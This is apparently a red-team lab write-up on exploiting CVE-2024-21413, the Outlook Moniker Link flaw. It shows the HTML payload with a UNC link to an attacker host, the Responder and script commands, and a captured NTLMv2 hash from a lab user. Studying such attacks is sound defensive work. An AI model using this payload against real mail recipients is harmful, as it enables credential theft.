# CVE-2024-21413 - Moniker Link Exploit via Outlook

This lab demonstrates exploitation of CVE-2024-21413 (Moniker Link vulnerability in Microsoft Outlook), which allows a remote attacker to capture NTLMv2 hashes by sending a specially crafted email. This report includes payload details, tool usage, and results captured during testing in a controlled environment.

## ‚öôÔ∏è Lab Setup

**Attacker Machine:**  
- OS: Kali Linux  
- Tool: Responder  
- Network: Host-only subnet with SMTP and SMB routing to victim  

**Victim Machine:**  
- OS: Windows 10 (Outlook configured)  
- Email client: Microsoft Outlook  
- Network: Same subnet as attacker  

## üì¨ Email Payload

The payload is an HTML email with an embedded UNC path triggering an SMB request when opened in Outlook. The HTML code was embedded and sent via a Python script:

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```
The email was crafted using [this script](https://github.com/colinlyons29/redteam-walkthroughs/blob/main/CVE-2024-21413-MonikerLink/payload/exploit.py) credit to CMNatic

## üß† Exploit Process
Started Responder on Kali to listen for inbound SMB connections:
```
sudo responder -I eth0
```
Executed the email payload script on the attacker machine:
```
python3 exploit.py
```
Victim then opened the email in Outlook & clicked the link provided.
Responder captured the NTLMv2 hash from the victim system:
```
[SMB] NTLMv2-SSP Client : ::ffff:10.10.134.81
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
[SMB] NTLMv2-SSP Hash
: tryhackme: :THM-MONIKERLINK:d884749f68a6de55:CAFD9223FFA851DCB6B4F07C7240B104:01010000000000008016FE5018BBDB01CD6FAFD58D762C0600000000
0200080050004A0030004A0001001E00570049004E002D004A00580039004B00420052004C004B0031005800370004003400570049004E002D004A00580039004B00420052004C004B003100580037002
E0050004A0030004A002E004C004F00430041004C000300140050004A0030004A002E004C004F00430041004C000500140050004A0030004A002E004C004F00430041004C00070008008016FE5018BBDB
01060004000200000008003000300000000000000000000000002000004099F5BC7F5925B8B3AD139935B27D31DDF17B4BF729DDE9C6AA11E3227981900A0010000000000000000000000000000000000
00900240063006900660073002F00310030002E00310030002E003100380037002E00320033003700000000000000000000000000
```

## üß™ Outcome
- Successfully triggered Outlook to initiate an SMB authentication attempt via Moniker Link.

- Captured NTLMv2 hash using Responder.

- The hash can be cracked offline with hashcat or john for potential credential compromise.

## üîê Notes
- Microsoft has patched this issue as of February 2024.

- The attack demonstrates the risks of UNC path resolution in email clients.

## üß∞ Tools Used
- Kali Linux (2024.1)

- Responder

- Python 3.10

- Outlook 2019 on Windows 10 VM

## üßæ References
- [CVE-2024-21413 on NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

- [Microsoft Patch Details](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413)

- [CMNatic GitHub Payload](https://github.com/cmnatic)

